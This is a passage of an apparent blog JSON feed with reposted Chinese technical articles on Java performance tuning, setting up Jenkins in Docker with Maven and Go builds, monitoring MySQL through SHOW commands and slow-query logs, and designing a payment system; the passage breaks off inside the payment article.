class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">public class StreamTest &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">            list.add(i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(list);</span><br><span class=\"line\">        List&lt;Integer&gt; result = list.stream().parallel().map(i -&gt; i++).collect(Collectors.toList());</span><br><span class=\"line\">        System.out.println(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>我勒个去，什么情况？<br><img src=\"/img/2024/202405104.webp\" alt=\"erik.xyz\"></p>\n<p><strong>（3）parallel()的优缺点</strong></p>\n<p><strong>①优点：</strong></p>\n<p>1.充分利用多核 CPU 的优势，提高程序的性能；</p>\n<p>2.可以简化多线程编程，减少开发难度。</p>\n<p><strong>②缺点：</strong></p>\n<p>1.并行处理可能会引入线程安全等问题，需要根据具体情况进行选择；</p>\n<p>2.并行处理需要付出额外的开销，例如线程池的创建和销毁、线程切换等，对于小数据量和简单计算而言，串行处理可能更快。</p>\n<p><strong>（4）何时使用parallel()？</strong></p>\n<p>在实际开发中，应该根据数据量、计算复杂度、硬件等因素综合考虑。</p>\n<p>比如：</p>\n<p>1.数据量较大，有1万个元素；</p>\n<p>2.计算复杂度过大，需要对每个元素进行复杂的计算；</p>\n<p>3.硬件够硬，比如多核CPU。</p>\n<h4 id=\"七、算法优化\"><a href=\"#七、算法优化\" class=\"headerlink\" title=\"七、算法优化\"></a>七、算法优化</h4><p>在上面的例子中，避免base64解密，就应该归类于算法优化。</p>\n<p>程序就是由数据结构和算法组成，一个优质的算法可以显著提高程序的执行效率，从而减少运行时间和资源消耗。相比之下，一个低效的算法就可能导致运行非常缓慢，并占用大量系统资源。</p>\n<p>很多问题都可以通过算法优化来解决，比如：</p>\n<p><strong>1、循环和递归</strong></p>\n<p>循环和递归是Java编程中常见的操作，然而，过于复杂的业务逻辑往往会带来多层循环套用，不必要的重复循环会大大降低程序的执行效率。</p>\n<p>递归是一种函数自我调用的技术，类似于循环，虽然递归可以解决很多问题，但是，递归的效率有待提高。</p>\n<p><strong>2、内存管理</strong></p>\n<p>Java自带垃圾收集器，开发人员不用手动释放内存。</p>\n<p>但是，不合理的内存使用可能导致内存泄漏和性能下降，确保及时释放不再使用的对象，避免创建过多的临时对象。</p>\n<p><strong>3、字符串</strong></p>\n<p>我觉得字符串是Java编程中使用频率最高的技术，很多程序员恨不得把所有的变量都定义成字符串。</p>\n<p>然而，由于字符串是不可变的，每次执行字符串拼接、替换时，都会创建一个新的字符串。这会占用大量的内存和处理时间。</p>\n<p>使用StringBuilder来处理字符串的拼接可以显著的提高性能。</p>\n<p><strong>4、IO操作</strong></p>\n<p>IO操作通常是最耗费性能和资源的操作。在处理大量数据IO操作时，务必注意优化IO代码，提高程序性能，比如上面提高的图片不落地就是彻底解决IO问题。</p>\n<p><strong>5、数据结构的选择</strong></p>\n<p>选择适当的数据结构对程序的性能至关重要。</p>\n<p>比如Java世界中用的第二多的Map，比较常用的有HashMap、HashTable、ConcurrentHashMap。</p>\n<p>HashMap，底层数组+链表实现，可以存储null键和null值，线程不安全；</p>\n<p>HashTable，底层数组+链表实现，无论key还是value都不能为null，线程安全，实现线程安全的方式是在修改数据时锁住整个HashTable，效率低，ConcurrentHashMap做了相关优化；</p>\n<p>ConcurrentHashMap，底层采用分段的数组+链表实现，线程安全，通过把整个Map分为N个Segment，可以提供相同的线程安全，但是效率提升N倍，默认提升16倍。</p>\n<p>Hashtable的synchronized是针对整张Hash表的，即每次锁住整张表让线程独占，ConcurrentHashMap允许多个修改操作并发进行，其关键在于使用了锁分离技术。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/V2p_p-KoDowlZxLN2by2Sg\">哪吒编程</a></p>\n",
            "tags": [
                "web",
                "优化"
            ]
        },
        {
            "id": "https://erik.xyz/2024/04/06/five-jenkis/",
            "url": "https://erik.xyz/2024/04/06/five-jenkis/",
            "title": "5分钟搞定Jenkis",
            "date_published": "2024-04-06T01:04:00.000Z",
            "content_html": "<h4 id=\"什么是持续集成\"><a href=\"#什么是持续集成\" class=\"headerlink\" title=\"什么是持续集成\"></a>什么是持续集成</h4><p>持续集成 Continuous integration ，简称CI随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能在不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。<br><span id=\"more\"></span><br>持续集成具有的特点：</p>\n<ul>\n<li><p>它是一个自动化的周期性的集成测试过程，从检出代码、编译构建、运行测试、结果记录、测试统计等都是自动完成的，无需人工干预；</p>\n</li>\n<li><p>需要有专门的集成服务器来执行集成构建；</p>\n</li>\n<li>需要有代码托管工具支持，例如Git以及可视化界面Gogs的使用</li>\n</ul>\n<p>持续集成的作用：</p>\n<ul>\n<li>保证团队开发人员提交代码的质量，减轻了软件发布时的压力；</li>\n<li>持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量；</li>\n</ul>\n<h4 id=\"Jenkins简介\"><a href=\"#Jenkins简介\" class=\"headerlink\" title=\"Jenkins简介\"></a>Jenkins简介</h4><p>Jenkins，原名Hudson，2011年改为现在的名字，它是一个开源的实现持续集成的软件工具。官方网站：<a href=\"http://jenkins-ci.org/。\">http://jenkins-ci.org/。</a></p>\n<p>Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。</p>\n<p>特点：</p>\n<ul>\n<li>易安装：仅仅两个docker命令即可从官网下载直接运行，无需额外的安装，更无需安装数据库；</li>\n<li>易配置：提供友好的GUI配置界面；</li>\n<li>变更支持：Jenkins能从代码仓库（Subversion/CVS）中获取并产生代码更新列表并输出到编译输出信息中；</li>\n<li>支持永久链接：用户是通过web来访问Jenkins的，而这些web页面的链接地址都是永久链接地址，因此，你可以在各种文档中直接使用该链接；</li>\n<li>集成E-Mail/RSS/IM：当完成一次集成时，可通过这些工具实时告诉你集成结果（据我所知，构建一次集成需要花费一定时间，有了这个功能，你就可以在等待结果过程中，干别的事情）；</li>\n<li>JUnit/TestNG测试报告：也就是用以图表等形式提供详细的测试报表功能；</li>\n<li>支持分布式构建：Jenkins可以把集成构建等工作分发到多台计算机中完成；</li>\n<li>文件指纹信息：Jenkins会保存哪次集成构建产生了哪些jars文件，哪一次集成构建使用了哪个版本的jars文件等构建记录；</li>\n<li>支持第三方插件：使得 Jenkins 变得越来越强大Jenkins安装与启动（1）执行安装命令,下载jenkins</li>\n</ul>\n<h4 id=\"Jenkins安装与启动\"><a href=\"#Jenkins安装与启动\" class=\"headerlink\" title=\"Jenkins安装与启动\"></a>Jenkins安装与启动</h4><p>1）执行安装命令,下载jenkins<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull jenkins/jenkins</span><br></pre></td></tr></table></figure><br>（2）启动服务<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p 8080:8080 -p 50000:50000 -v /mnt/data/jenkins:/var/jenkins_home --name &quot;jenkins&quot; jenkins/jenkins</span><br></pre></td></tr></table></figure><br><img src=\"/img/2024/20240411.jpeg\" alt=\"erik.xyz\"></p>\n<p>若报错如下:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch: cannot touch ‘/var/jenkins_home/copy_reference_file.log’: Permission denied</span><br><span class=\"line\">Can not write to /var/jenkins_home/copy_reference_file.log. Wrong volume permissions?</span><br></pre></td></tr></table></figure></p>\n<p>需要修改下目录权限, 因为当映射本地数据卷时，/mnt/data/jenkins目录的拥有者为root用户，而容器中jenkins user的uid为1000<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chown -R 1000:1000 /mnt/data/jenkins</span><br></pre></td></tr></table></figure><br>（3）访问链接 <a href=\"http://10.20.29.151:8080\">http://10.20.29.151:8080</a></p>\n<p>若密码忘记，可进入容器，执行<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /var/lib/jenkins/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure><br>获取初始密码串。</p>\n<p>若目录不存在，可使用<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name &quot;initialAdminPassword&quot; -depth -print</span><br></pre></td></tr></table></figure><br>命令查找。<br><img src=\"/img/2024/20240412.png\" alt=\"erik.xyz\"></p>\n<p>（4）安装插件<br><img src=\"/img/2024/20240413.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240414.png\" alt=\"erik.xyz\"></p>\n<p>（5）新建用户<br><img src=\"/img/2024/20240415.png\" alt=\"erik.xyz\"></p>\n<p>完成安装进入主界面<br><img src=\"/img/2024/20240416.png\" alt=\"erik.xyz\"></p>\n<h4 id=\"Jenkins插件安装\"><a href=\"#Jenkins插件安装\" class=\"headerlink\" title=\"Jenkins插件安装\"></a>Jenkins插件安装</h4><p>我们以安装maven插件为例，演示插件的安装</p>\n<p>（1）点击左侧的“系统管理”菜单 ,然后点击<br><img src=\"/img/2024/20240417.jpeg\" alt=\"erik.xyz\"></p>\n<p>（2）选择“可选插件”选项卡，搜索maven，在列表中选择Maven Integration ，点击“直接安装”按钮<br><img src=\"/img/2024/20240418.jpeg\" alt=\"erik.xyz\"></p>\n<p>看到如下图时，表示已经完成<br><img src=\"/img/2024/20240419.png\" alt=\"erik.xyz\"></p>\n<h5 id=\"全局工具配置\"><a href=\"#全局工具配置\" class=\"headerlink\" title=\"全局工具配置\"></a>全局工具配置</h5><p>选择系统管理，全局工具配置<br><img src=\"/img/2024/20240420.png\" alt=\"erik.xyz\"></p>\n<p><strong>自动安装</strong></p>\n<p>Jenkins提供了两种工具配置的方式，我们还是以maven为例<br><img src=\"/img/2024/20240421.png\" alt=\"erik.xyz\"></p>\n<p>第一种如上图，只需要选择自动安装和版本号就可以，同时Jenkins在右上角给出了一个解疑按键，可以通过该键看到说明和示例。</p>\n<p><strong>本地安装</strong><br>相较于第一种方式，第二种方式相对麻烦一些，但好处是可以在以后打包的时候不必重新下载，缩短打包的时间。</p>\n<p>下面就来教大家如何安装Maven与本地仓库：</p>\n<p>（1）将Maven压缩包上传至服务器（虚拟机）</p>\n<p>（2）解压<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar zxvf apache-maven-3.5.4-bin.tar.gz</span><br></pre></td></tr></table></figure><br>（3）移动目录<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv apache-maven-3.5.4 /usr/local/maven</span><br></pre></td></tr></table></figure><br>（4）编辑setting.xml配置文件vi /usr/local/maven/conf/settings.xml，配置本地仓库目录,内容如下<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;localRepository&gt;/usr/local/repository&lt;/localRepository&gt;</span><br></pre></td></tr></table></figure><br>（5）将开发环境的本地仓库上传至服务器（虚拟机）并移动到/usr/local/repository 。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv reponsitory_boot /usr/local/repository</span><br></pre></td></tr></table></figure></p>\n<p>其他示例:</p>\n<p>（1）JDK配置<br><img src=\"/img/2024/20240422.png\" alt=\"erik.xyz\"></p>\n<p>设置javahome为 /usr/java/jdk1.8.0_171-amd64</p>\n<p>（2）Git配置 （本地已经安装了Git软件）<br><img src=\"/img/2024/20240423.png\" alt=\"erik.xyz\"></p>\n<p>（3）Maven配置<br><img src=\"/img/2024/20240424.png\" alt=\"erik.xyz\"></p>\n<p><strong>代码上传至Git服务器</strong></p>\n<p>步骤：</p>\n<p>（1）在本地安装git(Windows版本)</p>\n<p>（2）在IDEA中选择菜单 : File — settings , 在窗口中选择Version Control — Git<br><img src=\"/img/2024/20240425.png\" alt=\"erik.xyz\"></p>\n<p>（3）选择菜单VCS —&gt; Enable Version Control Integration…<br><img src=\"/img/2024/20240426.png\" alt=\"erik.xyz\"></p>\n<p>选择Git</p>\n<p>（4）设置远程地址: 右键点击工程选择菜单 Git —&gt; Repository —&gt;Remotes…<br><img src=\"/img/2024/20240427.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240428.png\" alt=\"erik.xyz\"></p>\n<p>(5）右键点击工程选择菜单 Git —&gt; Add</p>\n<p>（6）右键点击工程选择菜单 Git —&gt; Commit Directory…</p>\n<p>（7）右键点击工程选择菜单 Git —&gt; Repository —&gt; Push …</p>\n<p><strong>任务的创建与执行</strong></p>\n<p>我们以最火的Java项目和Go项目为例，给大家分别演示如何构建项目和执行</p>\n<p><strong>Go项目</strong></p>\n<p>（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个自由风格的项目，点击OK<br><img src=\"/img/2024/20240429.png\" alt=\"erik.xyz\"><br>（2）General管理，可以添加项目描述和GitHub项目路径，以及一些配置<br><img src=\"/img/2024/20240430.png\" alt=\"erik.xyz\"><br>（3）源码管理，选择GitHub<br><img src=\"/img/2024/20240431.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240432.png\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240433.png\" alt=\"erik.xyz\"></p>\n<p>（4）构建触发器，配置触发规则，这里以定时和轮询为示例，配别设置为<br><img src=\"/img/2024/20240434.png\" alt=\"erik.xyz\"></p>\n<p>定时构建：定时构建1次任务</p>\n<p>轮询SCM:定时查看源码管理的代码是否更新，有更新则构建，否则不会构建</p>\n<p>如图所示，定时构建为每间隔10分钟定时构建一次，轮询SCM为每5分钟轮询检测一次。</p>\n<p><span style=\"color: #808080;\">时间*号规则为: 分 时 日 月 周</span></p>\n<p>（5）构建环境，配置控制台输出时间戳和指定Go语言版本<br><img src=\"/img/2024/20240435.png\" alt=\"erik.xyz\"><br>（6）构建，使用Shell脚本测试代码上传后的项目是否有效<br><img src=\"/img/2024/20240436.jpeg\" alt=\"erik.xyz\"></p>\n<p>Shell如下:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export GOPATH=$WORKSPACE/../                    # 指定GOPATH路径，Go语言执行必须有GOPATH路径</span><br><span class=\"line\">export GOWORK=$GOPATH/src/github.com/Jenkins    # 创建项目执行时的目录依赖结构</span><br><span class=\"line\">cp -rf $WORKSPACE/* $GOWORK/                    # 使测试运行数据和源数据隔离</span><br><span class=\"line\">cd $GOWORK &amp;&amp; go build                          # 进入项目目录并执行</span><br></pre></td></tr></table></figure></p>\n<p>命令解说：<br><span style=\"color: #808080;\"><br>$GOPATH Go 运行需要指定 GOPATH 也即项目运行路径<br>$WORKSPACE /var/jenkins_home/workspace/Jenkins<br>GOWORK 创建符合代码依赖的执行目录<br>注:下载Go的插件在构建时，会自动为我们设置GOROOT,但不会指定GOPATH，因此需要指定\n</span><br>最后点击“保存”按钮</p>\n<p>（7）执行构建，控制台查看输出<br><img src=\"/img/2024/20240437.jpeg\" alt=\"erik.xyz\"><br><img src=\"/img/2024/20240438.jpeg\" alt=\"erik.xyz\"></p>\n<p>构建成功，也输出了WORKSPACE、GOPATH、GOROOT目录，说明配置生效。进入docker容器或是挂载目录查看是否有可执行文件：<br><img src=\"/img/2024/20240439.png\" alt=\"erik.xyz\"><br>除了上述方法，也可以通过shell配置docker等方式构建、部署、运行项目，还可以将项目配置到当前/其他服务器运行，更多配置方式就不一一陈述了，请自行挖掘。</p>\n<p><strong>JAVA项目</strong></p>\n<p>（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个Maven项目，点击OK<br><img src=\"/img/2024/20240440.jpeg\" alt=\"erik.xyz\"></p>\n<p>（2）源码管理，选择Git<br><img src=\"/img/2024/20240441.png\" alt=\"erik.xyz\"><br>(3）Build<br><img src=\"/img/2024/20240442.png\" alt=\"erik.xyz\"></p>\n<p>命令:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clean package docker:build -DpushImage</span><br></pre></td></tr></table></figure><br>用于清除、打包，构建docker镜像</p>\n<p>最后点击“保存”按钮</p>\n<p>（4）执行任务</p>\n<p>后续请参照Go项目的执行步骤。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/PEupc5YIKuctZO1Tivy_ug\">架构师社区</a></p>\n",
            "tags": [
                "转载",
                "jenkis",
                "jenkis教程"
            ]
        },
        {
            "id": "https://erik.xyz/2023/05/15/mysql-top-log/",
            "url": "https://erik.xyz/2023/05/15/mysql-top-log/",
            "title": "MYSQL 最朴素的监控方式",
            "date_published": "2023-05-15T14:24:00.000Z",
            "content_html": "<p>对于当前数据库的监控方式有很多，分为数据库自带、商用、开源三大类，每一种都有各自的特色；而对于 mysql 数据库由于其有很高的社区活跃度，监控方式更是多种多样，不管哪种监控方式最核心的就是监控数据，获取得到全面的监控数据后就是灵活的展示部分。那我们今天就介绍一下完全采用 mysql 自有方式采集获取监控数据，在单体下达到最快速、方便、损耗最小。<br><span id=\"more\"></span><br>本次文章完全使用 mysql 自带的 show 命令实现获取，从 connects、buffercache、lock、SQL、statement、Database throughputs、serverconfig7 大方面全面获取监控数据。</p>\n<ol>\n<li><p>连接数（Connects）</p>\n<ul>\n<li><p>最大使用连接数：show status like ‘Max_used_connections’</p>\n</li>\n<li><p>当前打开的连接数：show status like ‘Threads_connected’</p>\n</li>\n</ul>\n</li>\n</ol>\n<ul>\n<li><p>缓存（bufferCache）</p>\n<ul>\n<li>未从缓冲池读取的次数：show status like ‘Innodb_buffer_pool_reads’</li>\n<li>从缓冲池读取的次数：show status like ‘Innodb_buffer_pool_read_requests’</li>\n<li>缓冲池的总页数：show status like ‘Innodb_buffer_pool_pages_total’</li>\n<li>缓冲池空闲的页数：show status like ‘Innodb_buffer_pool_pages_free’</li>\n<li>缓存命中率计算：（1-Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests）*100%</li>\n<li>缓存池使用率为：((Innodb_buffer_pool_pages_total-Innodb_buffer_pool_pages_free）/Innodb_buffer_pool_pages_total）*100%</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><p>锁（lock）</p>\n<ul>\n<li>锁等待个数：show status like ‘Innodb_row_lock_waits’</li>\n<li>平均每次锁等待时间：show status like ‘Innodb_row_lock_time_avg’</li>\n<li>查看是否存在表锁：show open TABLES where in_use&gt;0；有数据代表存在锁表，空为无表锁</li>\n</ul>\n<p>备注：锁等待统计得数量为累加数据，每次获取得时候可以跟之前得数据进行相减，得到当前统计得数据</p>\n</li>\n<li><p>SQL</p>\n<ul>\n<li>查看 mysql 开关是否打开：show variables like ‘slow_query_log’，ON 为开启状态，如果为 OFF，set global slow_query_log=1 进行开启</li>\n<li>查看 mysql 阈值：show variables like ‘long_query_time’，根据页面传递阈值参数，修改阈值 set global long_query_time=0.1</li>\n<li>查看 mysql 慢 sql 目录：show variables like ‘slow_query_log_file’</li>\n<li>格式化慢 sql 日志：mysqldumpslow -s at -t 10 /export/data/mysql/log/slow.log 注：此语句通过 jdbc 执行不了，属于命令行执行。意思为：显示出耗时最长的 10 个 SQL 语句执行信息，10 可以修改为 TOP 个数。显示的信息为：执行次数、平均执行时间、SQL 语句</li>\n</ul>\n<p>备注：当 mysqldumpslow 命令执行失败时，将慢日志同步到本地进行格式化处理。</p>\n</li>\n<li><p>statement</p>\n<ul>\n<li>insert 数量：show status like ‘Com_insert’</li>\n<li>delete 数量：show status like ‘Com_delete’</li>\n<li>update 数量：show status like ‘Com_update’</li>\n<li>select 数量：show status like ‘Com_select’</li>\n</ul>\n</li>\n<li><p>吞吐（Database throughputs）</p>\n<ul>\n<li>发送吞吐量：show status like ‘Bytes_sent’</li>\n<li>接收吞吐量：show status like ‘Bytes_received’</li>\n<li>总吞吐量：Bytes_sent+Bytes_received</li>\n</ul>\n</li>\n<li><p>数据库参数（serverconfig）</p>\n<p> show variables</p>\n</li>\n<li><p>慢 SQL</p>\n</li>\n</ol>\n<p>慢 SQL 指的是 MySQL 慢查询，具体指运行时间超过 long_query_time 值的 SQL。我们常听 MySQL 中有二进制日志 binlog、中继日志 relaylog、重做回滚日志 redolog、undolog 等。针对慢查询，还有一种慢查询日志 slowlog，用来记录在 MySQL 中响应时间超过阀值的语句。慢 SQL 对实际生产业务影响是致命的，所以测试人员在性能测试过程中，对数据库 SQL 语句执行情况实施监控，给开发提供准确的性能优化意见显得尤为重要。那怎么使用 Mysql 数据库提供的慢查询日志来监控 SQL 语句执行情况，找到消耗较高的 SQL 语句，以下详细说明一下慢查询日志的使用步骤：</p>\n<ul>\n<li>确保打开慢 SQL 开关 slow_query_log</li>\n<li>设置慢 SQL 域值 long_query_time 这个 long_query_time 是用来定义慢于多少秒的才算 “慢查询”，注意单位是秒，我通过执行 sql 指令 set long_query_time=1 来设置了 long_query_time 的值为 1, 也就是执行时间超过 1 秒的都算慢查询，如下：</li>\n<li>查看慢 SQL 日志路径</li>\n<li>通过慢 sql 分析工具 mysqldumpslow 格式化分析慢 SQL 日志 mysqldumpslow 慢查询分析工具，是 mysql 安装后自带的，可以通过./mysqldumpslow —help 查看使用参数说明</li>\n</ul>\n<p>常见用法：</p>\n<ol>\n<li>取出使用最多的 10 条慢查询 ./mysqldumpslow -s c -t 10 /export/data/mysql/log/slow.log</li>\n<li><p>取出查询时间最慢的 3 条慢查询 ./mysqldumpslow -s t -t 3 /export/data/mysql/log/slow.log</p>\n<p>注意：使用 mysqldumpslow 的分析结果不会显示具体完整的 sql 语句，只会显示 sql 的组成结构；假如: SELECT FROM sms_send WHERE service_id=10 GROUP BY content LIMIT 0, 1000; mysqldumpslow 命令执行后显示：Count: 2 Time=1.5s (3s) Lock=0.00s (0s) Rows=1000.0 (2000), vgos_dba[vgos_dba]@[10.130.229.196]SELECT FROM sms_send WHERE service_id=N GROUP BY content LIMIT N, N</p>\n</li>\n</ol>\n<p>mysqldumpslow 的分析结果详解：</p>\n<ul>\n<li>Count：表示该类型的语句执行次数，上图中表示 select 语句执行了 2 次。</li>\n<li>Time：表示该类型的语句执行的平均时间（总计时间）</li>\n<li>Lock：锁时间 0s。</li>\n<li>Rows：单次返回的结果数是 1000 条记录，2 次总共返回 2000 条记录。<br>通过这个工具就可以查询出来哪些 sql 语句是慢 SQL，从而反馈研发进行优化，比如加索引，该应用的实现方式等。</li>\n</ul>\n<h5 id=\"常见慢-SQL-排查\"><a href=\"#常见慢-SQL-排查\" class=\"headerlink\" title=\"常见慢 SQL 排查\"></a>常见慢 SQL 排查</h5><ol>\n<li><p>不使用子查询</p>\n<p>SELECT FROM t1 WHERE id (SELECT id FROM t2 WHERE name=’hechunyang’); 子查询在 MySQL5.5 版本里，内部执行计划器是这样执行的：先查外表再匹配内表，而不是先查内表 t2，当外表的数据很大时，查询速度会非常慢。在 MariaDB10/MySQL5.6 版本里，采用 join 关联方式对其进行了优化，这条 SQL 会自动转换为 SELECT t1. FROM t1 JOIN t2 ON t1.id = t2.id; 但请注意的是：优化只针对 SELECT 有效，对 UPDATE/DELETE 子 查询无效， 生产环境尽量应避免使用子查询。</p>\n</li>\n<li><p>避免函数索引</p>\n<p>SELECT FROM t WHERE YEAR(d) &gt;= 2016; 由于 MySQL 不像 Oracle 那样⽀持函数索引，即使 d 字段有索引，也会直接全表扫描。应改为 &gt; SELECT FROM t WHERE d &gt;= ‘2016-01-01’;</p>\n</li>\n<li><p>用 IN 来替换 OR 低效查询</p>\n<p>慢 SELECT FROM t WHERE LOC_ID = 10 OR LOC_ID = 20 OR LOC_ID = 30; 高效查询 &gt; SELECT FROM t WHERE LOC_IN IN (10,20,30);</p>\n</li>\n<li><p>LIKE 双百分号无法使用到索引</p>\n<p>SELECT FROM t WHERE name LIKE ‘%de%’; 使用 SELECT FROM t WHERE name LIKE ‘de%’;</p>\n</li>\n<li><p>分组统计可以禁止排序</p>\n<p>SELECT goods_id,count() FROM t GROUP BY goods_id; 默认情况下，MySQL 对所有 GROUP BY col1，col2… 的字段进⾏排序。如果查询包括 GROUP BY，想要避免排序结果的消耗，则可以指定 ORDER BY NULL 禁止排序。使用 SELECT goods_id,count () FROM t GROUP BY goods_id ORDER BY NULL;</p>\n</li>\n<li><p>禁止不必要的 ORDER BY 排序</p>\n<p>SELECT count(1) FROM user u LEFT JOIN user_info i ON u.id = i.user_id WHERE 1 = 1 ORDER BY u.create_time DESC; 使用 SELECT count (1) FROM user u LEFT JOIN user_info i ON u.id = i.user_id;</p>\n</li>\n</ol>\n<p>9.总结</p>\n<ul>\n<li>任何东西不应过重关注其外表，要注重内在的东西，往往绚丽的外表下会有对应的负担和损耗。</li>\n<li>mysql 数据库的监控支持通过 SQL 方式从 performance_schema 库中访问对应的表数据，前提是初始化此库并开启监控数据写入。</li>\n<li>对于监控而言，不在于手段的多样性，而需要明白监控的本质，以及需要的监控项内容，找到符合自身项目特色的监控方式。</li>\n<li>在选择监控工具对 mysql 监控时，需要关注监控工具本身对于数据库服务器的消耗，不要影响到其自身的使用。</li>\n</ul>\n<p>链接：<a href=\"https://my.oschina.net/u/4090830/blog/5564849\">https://my.oschina.net/u/4090830/blog/5564849</a></p>\n",
            "tags": [
                "mysql",
                "mysql监控"
            ]
        },
        {
            "id": "https://erik.xyz/2023/04/05/all-pay-system/",
            "url": "https://erik.xyz/2023/04/05/all-pay-system/",
            "title": "通用的支付系统该如何设计",
            "date_published": "2023-04-05T13:56:00.000Z",
            "content_html": "<p>支付永远是一个公司的核心领域，因为这是一个有交易属性公司的命脉。那么，支付系统到底长什么样，又是怎么运行交互的呢?抛开带有支付牌照的金融公司的支付架构，下述链路和系统组成基本上符合绝大多数支付场景。其实整体可以看成是交易核心+支付核心 两个大系统。交易系统关联了业务场景和底层支付，而支付系统完成了调用支付工具到对账清算等一系列相关操作。下面我们就来一起看下各个系统的核心组成和交互。<br><span id=\"more\"></span></p>\n<ol>\n<li>支付系统总览</li>\n</ol>\n<ul>\n<li><p>核心系统交互<br><img src=\"/img/202304/20230605215759.png\" alt=\"\"></p>\n</li>\n<li><p>业务图谱</p>\n</li>\n</ul>\n<p><img src=\"/img/202304/20230605215938.png\" alt=\"\"></p>\n<ol>\n<li>核心系统解析</li>\n</ol>\n<ul>\n<li>交易核心</li>\n</ul>\n<p>交易核心把公司的业务系统和底层支付关联起来，让业务系统专注于业务，不比关心底层支付。</p>\n<p><img src=\"/img/202304/20230605220106.png\" alt=\"&#39;交易核心&#39;\"></p>\n<ul>\n<li>基础交易类型抽象<br><img src=\"/img/202304/20230605220120.png\" alt=\"\"></li>\n</ul>\n<ul>\n<li>多表聚合 &amp; 订单关联<br><img src=\"/img/202304/20230605220132.png\" alt=\"\"></li>\n</ul>\n<ul>\n<li>支付核心</li>\n</ul>\n<p>支付核心主要负责将多种支付类型进行抽象，变成充值、提现、退款、转账四种支付形态。同时，还要负责集成多种支付工具，对支付指令进行编排等等。</p>\n<p><img src=\"/img/202304/20230605220303.png\" alt=\"&#39;支付核心总览&#39;\"></p>\n<p> 支付行为编排</p>\n<p>其目的，是实现插件式开发、支付规则可配置的 灵活开发方式。</p>\n<p><img src=\"/img/202304/20230605220319.png\" alt=\"\"></p>\n<p>异常处理</p>\n<p>异常处理包括了 重复支付、部分支付、金额不一致、其他异常等异常场景。<br><img src=\"/img/202304/20230605220332.png\" alt=\"\"></p>\n<ul>\n<li><p>渠道网关<br><img src=\"/img/202304/20230605220342.png\" alt=\"\"></p>\n</li>\n<li><p>资金核算<br><img src=\"/img/202304/20230605220353.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>3.服务治理</p>\n<ul>\n<li>平台统一上下文</li>\n</ul>\n<p>通过确定系统边界、业务建模拆分之后，整个支付平台被拆分几十个服务，而如何保障在服务间流转业务信息不被丢失，是我们需要考虑的问题。平台统一上下文的要素信息（唯一业务标识码），在整个支付平台链路中全程传递，被用来解决这个问题。<br><img src=\"/img/202304/20230605220601.png\" 